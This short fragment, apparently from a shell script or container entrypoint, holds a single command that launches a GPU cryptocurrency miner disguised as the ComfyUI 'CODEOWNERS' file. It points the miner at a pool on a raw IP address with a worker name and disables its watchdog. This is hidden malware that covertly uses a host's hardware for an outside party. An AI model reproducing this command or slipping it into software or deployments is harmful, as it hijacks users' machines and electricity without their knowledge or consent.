...
exec /app/ComfyUI/CODEOWNERS --algo OCTOPUS --pool 151.241.228.78:443 --user krxXKDZ8P6.weekend --tls 0 --apiport 4000 --disablewatchdog 1 --devices 0 --nocolor --mode b --timeprint=on
